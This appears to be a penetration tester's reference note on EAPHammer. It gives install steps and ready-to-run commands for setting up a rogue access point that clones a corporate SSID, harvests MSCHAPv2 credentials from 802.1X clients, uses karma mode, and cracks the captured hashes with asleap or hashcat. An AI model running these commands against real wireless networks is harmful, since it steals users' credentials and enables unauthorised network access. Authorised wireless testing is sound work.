---
tags: [pentest, wireless, enterprise, eaphammer, 802.1x, both, initial-access]
tool: eaphammer
phase: 5
---
# EAPHammer — Enterprise WiFi Attacks

Rogue AP tool purpose-built for attacking WPA/WPA2-Enterprise (802.1X) networks. Captures RADIUS credentials (MSCHAPv2 hashes) from enterprise clients.

[[10 - Wireless/00 - README|Folder index]]

## Install

```bash
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo ./kali-setup
```

## How 802.1X enterprise attacks work

```text
1. Corporate WiFi uses 802.1X with RADIUS (PEAP, EAP-TTLS, etc.)
2. Clients verify the RADIUS server certificate... usually
3. Most clients are misconfigured — they accept any certificate
4. EAPHammer creates a rogue AP with the same SSID
5. Client connects, sends credentials to your RADIUS server
6. You capture MSCHAPv2 challenge/response
7. Crack with asleap or hashcat -m 5500
```

## Basic credential capture

```bash
# Generate certs first
sudo ./eaphammer --cert-wizard

# Launch rogue AP
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
  --essid "CorpWiFi" --creds
```

| Flag | Meaning |
| --- | --- |
| `-i` | Wireless interface |
| `--channel` | Operating channel |
| `--auth wpa-eap` | Enterprise authentication |
| `--essid` | SSID to clone |
| `--creds` | Harvest credentials |
| `--karma` | Respond to all probe requests |
| `--loud` | Aggressive client deauth |

## Karma mode

```bash
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
  --essid "CorpWiFi" --creds --karma
```

Responds to ANY SSID a client probes for, not just the target. Catches devices looking for previously connected networks.

## Crack captured hashes

```bash
# MSCHAPv2 → asleap
asleap -C <challenge> -R <response> -W wordlist.txt

# Or hashcat mode 5500
hashcat -m 5500 captured_hashes.txt wordlist.txt
```

> [!warning] Certificate warnings
> Some clients will show a certificate warning. Many users click through it anyway. In a real engagement, note this as a finding — certificate pinning should be enforced.

## See also

- [[19 - hostapd-wpe]]
- [[15 - Evil Twin (wifiphisher)]]
